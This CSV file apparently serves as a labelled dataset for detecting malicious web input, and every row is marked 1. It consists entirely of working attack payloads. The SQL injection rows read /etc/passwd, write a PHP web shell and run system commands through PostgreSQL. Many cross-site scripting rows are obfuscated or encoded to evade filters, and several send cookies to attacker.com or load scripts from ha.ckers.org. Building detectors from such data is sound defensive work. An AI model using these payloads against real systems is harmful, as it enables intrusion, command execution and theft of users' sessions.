payload,label
"SELECT @@VERSION, USER(), DATABASE();",1
SELECT table_name FROM information_schema.tables;,1
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';,1
SELECT 'malicious code' INTO OUTFILE '/var/www/html/shell.php';,1
SELECT LOAD_FILE('/etc/passwd');,1
"SELECT CONCAT('a', 'b');",1
SLEEP(5),1
SELECT banner FROM v$version;,1
SELECT user FROM dual;,1
SELECT table_name FROM all_tables;,1
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';,1
BEGIN DBMS_LOCK.SLEEP(5); END;,1
' UNION SELECT NULL FROM DUAL--,1
"' UNION SELECT NULL,NULL FROM DUAL--",1
"SELECT version(), current_user, current_database();",1
SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname = 'public';,1
COPY (SELECT 'malicious') TO '/tmp/test';,1
CREATE TABLE shell(output text);,1
COPY shell FROM PROGRAM 'id';,1
SELECT * FROM shell;,1
SELECT pg_sleep(5);,1
' AND (SELECT 1 FROM (SELECT(pg_sleep(5)))a)--,1
SELECT sqlite_version();,1
SELECT name FROM sqlite_master WHERE type='table';,1
PRAGMA table_info('users');,1
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;,1
CREATE TABLE pwn.shell (code TEXT);,1
"INSERT INTO pwn.shell (code) VALUES ('<?php system($_GET[""cmd""]); ?>');",1
"<a onclick=""alert(omurugur);"">/",1
"""><img src=x onerror=prompt(/omur/)>",1
""");</script><script>alert(1)</script>""",1
"""><aUdIo SrC=x OnErRoR=alert(71465)>');""",1
"""><svg/onload;=alert(1)>",1
?templid=1%27%22%3E%3Cscript%3Ealert%28%27XSS%20@%20%27%2bdocument.domain%29%3C%2fscript%3E,1
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1
"<IMG SRC=""jav	ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",1
"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",1
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",1
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",1
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
?attribute='</script><body onload&value=alert(document.cookie),1
"?value=A%27)%3b}%3balert(document.cookie)%3bif(0){var+html%3dwindow.opener.document.querySelector(%27[%3d""",1
?value=%22a%27);//%3C/script%3E%3Cbody%20onload=alert(document.cookie)%3E,1
\uFF1C%\uFE64input/autofocus onfocus\b='[1].find(alert)',1
"""><img src=x onerror=alert(document.domain)>",1
"<form action=""javascript:alert(document.domain)""><button>Click</button></form>",1
"""/><script>alert(1)</script>",1
//x:1/:///%01javascript:alert(document.cookie)/,1
"<a href=""javascript&colon;alert&lpar;document&period;domain&rpar;"">Click Here</a>",1
'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>',1
%0aalert(1);/”><script>///,1
“><iframe src=”/tests/cors/%23/tests/auditor.php?q1=<img/src=x onerror=alert(1)”,1
*//”><script>/*alert(1)//,1
"""onmouseover='prompt(1)'bad="">",1
--></sCrIpT><sCrIpT>alert(1234)</sCrIpT>,1
"""><script src=https://x.com></script>",1
/<svg%20onload=alert(eval(‘document’+unescape(unescape(“%252e”))%2b’domain’))>,1
"test'""()&%<acx><ScRiPt >prompt(1)</ScRiPt>",1
"""()&%<ScRiPt >prompt(/XSS/)</ScRiPt>",1
"1""sTYLe='acu:Expre/**/SSion(prompt(1))'bad="">",1
'><img/src=''onerror='alert(atob(/PDMgVHJlbGxv/.source)),1
' OR '1'='1' #,1
<svG onLoad=prompt(1)>,1
"?29ced""><script>alert(1)</script>9d013=1",1
"""><img+src=1+onerror=alert('hacı')>&action=edit&comment=123\"">",1
</script><script type=text/javascript>alert(123)</script>,1
"<link href=""javascript:alert(1)"" rel=""next"">",1
"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>",1
"<a%20href=""java%1B%28Jscript:alert%281%29"">",1
<video src=1 onerror=alert(1)>,1
<audio src=1 onerror=alert(1)>,1
%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE,1
"<svg%20xmlns:xlink=""http://www.w3.org/1999/xlink""><a><circle%20r=100%20/><animate%20attributeName=""xlink:href""%20values="";javascript:alert(1)""%20begin=""0s""%20dur=""0.1s""%20fill=""freeze""/>",1
<a[\x0b]onmouseover=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>,1
"eval(""aler""+(!![]+[])[+[]])(""xss"")",1
"this[""document""][""cookie""]",1
window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]],1
this['ale'+(!![]+[])[-~[]]+(!![]+[])[+[]]](),1
this['\x64\x6f\x63\x75\x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie'],1
document['\x63\x6f\x6f\x6b\x69\x65'],1
%E2%80%B9%25tag+style%3D%22xss%3Aexpression%28alert%28123%29%29%22+%E2%80%BA,1
\%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//,1
%uff1cscript%uff1ealert(123456);%uff1c/script%uff1e,1
"<%tag style=""xss:expression(alert(123))"">",1
%uff1cscript%uff1ealert(123456)%uff1c/script%uff1e,1
"""123""+style=""behavior:url(http://www.biznet.com.tr/xss.htc)""",1
"""><img src='/Content/TTNet/Images/logo_user.gif'onerror=javascript:alert(""XSS"")>",1
<img src=1 onerror=innerHTML=location.hash> and http://victim.com#<img src=1 onerror=alert(1)>,1
<img src=sa onerror=eval(document.location.hash.substr(1))>,1
<script>alert('httpOnly Test: '  +document.cookie)</script>,1
"<rss version=""2.0"">",1
<channel>,1
<item>,1
"<title>BIZNET RSS XSS TEST &lt;script>alert(""BIZNET"");&lt;/script></title>",1
</item>,1
</channel>,1
</rss>,1
<img/src='x'/onerror='alert(1)'/>,1
<img/src=”x”/onerror=”alert(1)”/>,1
"""></iframe><img/src=""x""/onerror=""alert(1)""/><""",1
<img src=/ onerror=alert(1)>,1
<img/src/onerror=alert(1)>,1
"""+style=""bahaviour:expression(function{}{ alert('xxs') }(this)}'",1
""" type=""image"" src=""dontcare.jpg"" onerror=""alert(123)",1
'%26%26'javascript:alert%25281%2529//,1
http://site/utf-7.html?--+AD4-+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-,1
%A2%BE%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,1
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",1
"javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>"">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>""",1
"0;url=javascript:alert(1)"" http-equiv=""refresh"" """,1
<!</textarea <body onload='alert(1)'>,1
<script>decipher(document.forms.cipher); alert(document.forms.cipher.stream.value); document.forms.cipher.stream.value = document.forms.cipher.stream_copy.value;</script>,1
"<img/src=""mars.png""alt=""mars"">",1
"<object data=""javascript:alert(0)"">",1
"<object><param name=""src"" value=""javascript:alert(0)""></param></object>",1
<isindex type=image src=1 onerror=alert(1)>,1
<isindex action=javascript:alert(1) type=image>,1
<img src=x:alert(alt) onerror=eval(src) alt=0>,1
"<x:script xmlns:x=""http://www.w3.org/1999/xhtml"">alert('xss');</x:script>",1
""";location=location.hash)//#0={};alert(0)",1
alert(document.cookie),1
alert(document['cookie']),1
with(document)alert(cookie),1
"</a onmousemove=""alert(1)"">",1
""";document.write('<img sr'%2b'c=http://www.site.com/xss?'%2bdocument['cookie']%2b'>');""",1
<script x>alert(1)</script>/,1
%22%27%2F%3E%3Cscript%3Ealert%28'Props+To+TheRat'%29%3C%2Fscript%3E,1
'});%0aalert(1);%20//,1
"<script>String.fromCharCode(107, 51, 110, 122, 48)</script>",1
"""+onmouseover=""window.location='http://www.biznet.com.tr'",1
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%69%20%61%6D%20%68%65%72%65%27%29%3C%2F%73%63%72%69%70%74%3E,1
"<ScriPt>ALeRt(""i am here"")</scriPt>",1
%00<script>alert('XSS')</script>,1
"?>'""><script>alert(90889)</script>",1
"%22%20onmouseover%3dalert(String.fromCharCode(88,83,83))%20par%3d%22",1
%3Cbody%20onload=alert(document.cookie)%3E,1
%3ciMg+SrC%3dx+OnErRoR%3dalert(51336)%3e,1
<img%20src%3da%20onerror%3dalert(1)>,1
"”>alert(String.fromCharCode(88,83,83));",1
""" onmouseover=alert(23)",1
"""+onkeypress=""alert(23)""+""",1
"""+onmouseover=""alert(1)""+""",1
"111""+onmouseover=alert(11123);",1
'onfocus='alert(0x000381)',1
'onclick='alert(0x000381)',1
%uff1cscript%uff1ealert('vulnerability')%uff1c/script%uff1e,1
"""><SCRIPT SRC=""http://www.biznet.com.tr/turkcell_xss.jpg""></SCRIPT>",1
&lt;script&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;&lt;/script&gt;,1
%00&lt;script&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;&lt;/script&gt;,1
&lt;BGSOUND SRC=&quot;javascript:alert(&#039;XSS&#039;);&quot;&gt;,1
&quot&gt&lt;script&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;&lt;/script&gt;,1
"\'\"");|]*{%0d%0a<%00",1
"/""'></SCRIPT></TITLE></TEXTAREA>'/""></XSS/*-*/STYLE=xss:e/**/xpression(try{a=firstTime}catch(e){firstTime=1;alert(793202)})>",1
<script>alert('XSS')</script>,1
"""><script>alert('XSS')</script>",1
"""/><script>alert('XSS')</script>",1
'><script>alert('XSS')</script>,1
">""'><script>alert('XSS')</script>",1
/><script>alert('XSS')</script>,1
';}</script><script>alert('XSS')</script>,1
%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E,1
%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E,1
%3E%22%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E,1
%2F%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E,1
%u0027%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e,1
%u0022%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e,1
%u003e%u0022%u0027%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0058%u0053%u0053%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e,1
%u002f%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e,1
%0027%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e,1
%0022%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e,1
%003e%0022%0027%003e%003cscript%003ealert%0028%0027XSS%0027%0029%003c%002fscript%003e,1
%002f%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e,1
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1
"'';!--""<XSS>=&{()}",1
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,1
"<IMG SRC=""javascript:alert('XSS');"">",1
<IMG SRC=javascript:alert('XSS')>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,1
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",1
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",1
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",1
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1
"<SCR\0IPT>alert(""XSS"")</SCR\0IPT>",1
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",1
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,1
<SCRIPT SRC=//ha.ckers.org/.j>,1
"<IMG SRC=""javascript:alert('XSS')""",1
<iframe src=http://ha.ckers.org/scriptlet.html <,1
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,1
"\"";alert('XSS');//",1
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",1
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1
"<BODY BACKGROUND=""javascript:alert('XSS')"">",1
<BODY ONLOAD=alert('XSS')>,1
"<IMG DYNSRC=""javascript:alert('XSS')"">",1
"<IMG LOWSRC=""javascript:alert('XSS')"">",1
"<BGSOUND SRC=""javascript:alert('XSS');"">",1
"<BR SIZE=""&{alert('XSS')}"">",1
"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>",1
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",1
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",1
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,1
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",1
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",1
"<XSS STYLE=""behavior: url(xss.htc);"">",1
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS",1
"<IMG SRC='vbscript:msgbox(""XSS"")'>",1
"<IMG SRC=""mocha:[code]"">",1
"<IMG SRC=""livescript:[code]"">",1
¼script¾alert(¢XSS¢)¼/script¾,1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",1
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",1
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",1
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",1
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",1
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",1
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",1
"<DIV STYLE=""width: expression(alert('XSS'));"">",1
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",1
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",1
"<XSS STYLE=""xss:expression(alert('XSS'))"">",1
"exp/*<A STYLE='no\xss:noxss(""*//*"");",1
"xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",1
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",1
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",1
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",1
"<BASE HREF=""javascript:alert('XSS');//"">",1
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",1
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>,1
"<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>",1
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",1
"<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></XML> <SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
"<XML SRC=""xsstest.xml"" ID=I></XML> <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;""></BODY></HTML>",1
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",1
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",1
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"">",1
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<A HREF=""http://66.102.7.147/"">XSS</A>",1
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>",1
"<A HREF=""http://1113982867/"">XSS</A>",1
"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",1
"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",1
"<A HREF=""htt	p://6&#9;6.000146.0x7.147/"">XSS</A>",1
"<A HREF=""//www.google.com/"">XSS</A>",1
"<A HREF=""//google"">XSS</A>",1
"<A HREF=""http://ha.ckers.org@google"">XSS</A>",1
"<A HREF=""http://google:ha.ckers.org"">XSS</A>",1
"<A HREF=""http://google.com/"">XSS</A>",1
"<A HREF=""http://www.google.com./"">XSS</A>",1
"<A HREF=""javascript:document.location='http://www.google.com/'"">XSS</A>",1
"<A HREF=""http://www.gohttp://www.google.com/ogle.com/"">XSS</A>",1
%22%20style%3D%22background:expression(alert(1))%22%20OA%3D%22,1
3c%2fscript%3e%3cscript%3ealert(1);%3c%2fscript%3e,1
"""+on mouse over =""*****('XSS')",1
"""><sCrIpT>alert(02164699099)</sCrIpT>",1
"document.write(""\u003Cscript src=http://ha.ckers.org/xss.js\u003E\u003C/script\u003E"");",1
<SCRIPT>alert('XSS')</SCRIPT>,1
%3CSCRIPT%3Ealert%283%29%3C%2FSCRIPT%3E,1
"<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1
"<BODY BACKGROUND=""javascript:alert('XSS');"">",1
"<IMG LOWSRC=""javascript:alert('XSS');"">",1
"exp/*<XSS STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",1
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,1
"a=""get"";&#10;b=""URL("""";&#10;c=""javascript:"";&#10;d=""alert('XSS');"")"";eval(a+b+c+d);",1
"<TABLE BACKGROUND=""javascript:alert('XSS')""></TABLE>",1
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')""></TD></TABLE>",1
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>",1
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>",1
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>""> </BODY></HTML>",1
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,1
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",1
"<XSS STYLE=""behavior: url(http://ha.ckers.org/xss.htc);"">",1
"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'""-->",1
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",1
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1
"\"";alert(1);//",1
<SCRIPT SRC=http://ha.ckers.org/xss.js,1
<SCRIPT SRC=//ha.ckers.org/.j,1
<SCRIPT>a=/XSS/%0a%0dalert(a.source)</SCRIPT>,1
"<SCRIPT =""blah"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a=""blah"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<A HREF=""htt	p://6&#09;6.000146.0x7.147/"">XSS</A>",1
%3CIFRAME+SRC%3D%22javascript%3Aalert(1)%3B%22%3E%3C%2FIFRAME%3E,1
<script>alert(document.location)</script>,1
